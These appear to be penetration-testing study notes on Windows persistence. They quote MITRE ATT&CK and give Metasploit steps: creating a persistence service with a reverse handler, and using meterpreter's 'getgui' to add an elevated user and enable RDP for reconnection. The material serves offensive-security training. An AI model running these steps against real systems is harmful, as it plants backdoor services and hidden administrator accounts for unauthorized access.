# 8 - Windows Persistence

## <mark style="color:red;">Persistence Via Services</mark>

**Establishing Persistence On Windows**

* Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. - MITRE ATT\&CK.
* Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
* Note: The persistence technique you use will need to be in accordance with the rules of engagement laid out and agreed upon with the client.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# After gaining inital access & elevated privileges.
msf6 > use exploit/windows/local/persistence_service #Create a service enabling persistence for the attacker.
#Then use a multi/handler with the same parameters (LPORT, LHOST, Payload) to connect back to the victim.
```
{% endcode %}



## <mark style="color:red;">Persistence Via RDP</mark>

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
#After gaining inital access & elevated privileges.
# the "getgui" is used to check if RDP is enabled and to create a user acct.
meterpreter > run getgui -e -u <username> -p <password> #Create a new user account with elevated privileges, and enable RDP.

# rdp client to connect to RDP.
xfreedrp /u:<username> /p:<password> /v:<targetIP> #Connect to the newly created account through RDP
```
{% endcode %}



